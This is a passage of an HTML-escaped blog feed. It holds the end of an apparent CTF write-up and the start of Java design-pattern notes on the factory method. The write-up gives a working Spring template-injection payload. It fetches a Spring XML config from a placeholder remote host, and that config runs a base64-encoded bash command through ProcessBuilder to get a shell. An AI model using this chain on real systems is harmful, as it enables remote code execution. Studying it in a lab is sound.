&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">codeBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">docBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Now get the URL correponding to the resource name.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSystemResource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resourceName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resourceName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// If we found a URL, we try to locate the docbase by taking
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// of the final path name component, and the code base by taking
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// of the complete resourceName.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// So if we had a resourceName of &amp;#34;a/b/c.class&amp;#34; and we got an
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// objectURL of &amp;#34;file://bert/classes/a/b/c.class&amp;#34; then we would
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// want to set the codebase to &amp;#34;file://bert/classes/&amp;#34; and the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// docbase to &amp;#34;file://bert/classes/a/b/&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">objectUrl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">objectUrl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toExternalForm&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resourceName&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">ix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">resourceName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">codeBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">ix&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">docBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">codeBase&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lastIndexOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ix&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">docBase&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">ix&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Setup a default context and stub.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">BeansAppletContext&lt;/span> &lt;span style="color:#111">context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeansAppletContext&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stub&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">AppletStub&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeansAppletStub&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">context&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeBase&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">docBase&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stub&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">initializer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">initialize&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">beanContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// now, if there is a BeanContext, add the bean, if applicable.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unsafeBeanContextAdd&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// If it was deserialized then it was already init-ed.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Otherwise we need to initialize it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">serialized&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// We need to set a reasonable initial size, as many
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// applets are unhappy if they are started without
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// having been explicitly sized.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSize&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">needDummies&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">BeansAppletStub&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">stub&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">active&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">initializer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">activate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">applet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">unsafeBeanContextAdd&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cls为null则会默认调用ClassLoader.getSystemClassLoader()获取一个classloader，当结果为空时尝试调用ClassFinder.findClass(beanName, cls)&lt;/p>
&lt;h3 id="payload">payload&lt;/h3>
&lt;p>模板&lt;/p>
&lt;pre tabindex="0">&lt;code>{% set y= beans.get(&amp;#34;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&amp;#34;).resourceLoader.classLoader.loadClass(&amp;#34;java.beans.Beans&amp;#34;) %}
{% set yy = beans.get(&amp;#34;jacksonObjectMapper&amp;#34;).readValue(&amp;#34;{}&amp;#34;, y) %}
{% set yyy = yy.instantiate(null,&amp;#34;org.springframework.context.support.ClassPathXmlApplicationContext&amp;#34;) %}
{{ yyy.setConfigLocation(&amp;#34;http://xxxx/1.xml&amp;#34;) }}
{{ yyy.refresh() }}
&lt;/code>&lt;/pre>&lt;p>xml文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;beans&lt;/span> &lt;span style="color:#75af00">xmlns=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.springframework.org/schema/beans&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">xmlns:xsi=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">xsi:schemaLocation=&lt;/span>&lt;span style="color:#d88200">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;bean&lt;/span> &lt;span style="color:#75af00">id=&lt;/span>&lt;span style="color:#d88200">&amp;#34;pb&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span> &lt;span style="color:#75af00">init-method=&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;constructor-arg&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;list&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;value&amp;gt;&lt;/span>bash&lt;span style="color:#f92672">&amp;lt;/value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;value&amp;gt;&lt;/span>-c&lt;span style="color:#f92672">&amp;lt;/value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;value&amp;gt;&lt;/span>echo Li9nZXRmbGFnID4gL3RtcC9mbGFn|base64 -d|bash -i&lt;span style="color:#f92672">&amp;lt;/value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/list&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/constructor-arg&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/bean&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/beans&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先传模板再爆破包含，拿shell&lt;/p></description></item><item><title>Java学习笔记Ⅸ</title><link>https://amiaaaz.github.io/2022/09/04/java-study-notes-09-design-patterns/</link><pubDate>Sun, 04 Sep 2022 14:44:57 +0800</pubDate><guid>https://amiaaaz.github.io/2022/09/04/java-study-notes-09-design-patterns/</guid><description>&lt;p>学了小半年java了，审复杂一点的代码还是会被无情的java语法铁拳暴击，经常会被各种impl，interface给绕晕，一通debug下来属于是似是而非的懂了，但没有完全懂，所以小结一下关于设计模式相关的内容&lt;/p>
&lt;p>*纯笔记梳理向，无原创内容，主要来自于廖大的博客&lt;a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264742167474528">设计模式&lt;/a>，侵删&lt;/p>
&lt;h2 id="创建型模式">创建型模式&lt;/h2>
&lt;p>不使用这种设计模式时我们通常使用&lt;code>new&lt;/code>直接调用类的构造方法来创建实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// go
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">p1&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">p1&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果是简单的项目直接&lt;code>new&lt;/code>也没什么大问题，但是当出现很多执行流程明确但流程细节有小差异的业务时，我们希望把它们抽象出来，暴露一个接口供外界使用，根据我们传入的参数来动态创建实例或调用方法，做到易读易用&lt;/p>
&lt;h3 id="工厂方法factory-method">工厂方法Factory Method&lt;/h3>
&lt;p>工厂方法Factory Method是一种对象创建型模式，目的是使得创建对象和使用对象是分离的，并且客户端总是引用抽象工厂和抽象产品&lt;/p>
&lt;p>举例：我们希望实现一个解析字符串&lt;code>Number&lt;/code>的工厂，先抽象接口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">NumberFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再写实现类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">NumberFactoryImpl&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">NumberFactory&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BigDecimal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接口是&lt;code>NumberFactory&lt;/code>，实现类是&lt;code>NumberFactoryImpl&lt;/code>，返回的实际产品是&lt;code>BigDecimal&lt;/code>&lt;/p>
&lt;p>在工厂模式下，我们通常会在&lt;code>NumberFactory&lt;/code>中再定义一个静态方法来返回真正的子类用于客户端调用来创建实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">NumberFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">NumberFactory&lt;/span> &lt;span style="color:#75af00">getFactory&lt;/span>&lt;span style="color:#f92672">(){&lt;/span> &lt;span style="color:#75715e">// 获取工厂实例(实现类impl)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">impl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">NumberFactory&lt;/span> &lt;span style="color:#111">impl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NumberFactoryImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 创建实例 不需要客户手动new NumberFactoryImpl(); 让用户对该实现类无感
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时客户端再调用时只需要与接口&lt;code>NumberFactory&lt;/code>和抽象产品&lt;code>Number&lt;/code>打交道&lt;/p>
